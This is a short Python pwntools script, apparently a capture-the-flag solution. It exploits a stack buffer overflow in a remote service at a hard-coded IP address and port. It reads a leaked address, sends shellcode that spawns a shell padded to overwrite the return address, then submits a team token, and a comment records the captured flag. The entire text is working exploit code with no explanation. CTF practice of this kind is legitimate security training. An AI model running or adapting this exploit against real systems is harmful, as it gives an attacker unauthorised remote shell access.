from pwn import *

p = remote('106.75.95.47', 42264)

p.recvuntil('->')

addr = p32(int(p.read(10), 16))

shell = asm(shellcraft.sh())

buff = shell.ljust(76, 'a') + addr

p.sendline(buff)

p.recvuntil('token:')

p.sendline('teamtoken')

print(p.recvline())


# flag{d6e6458beb5136a1754400ce550ed2cd}
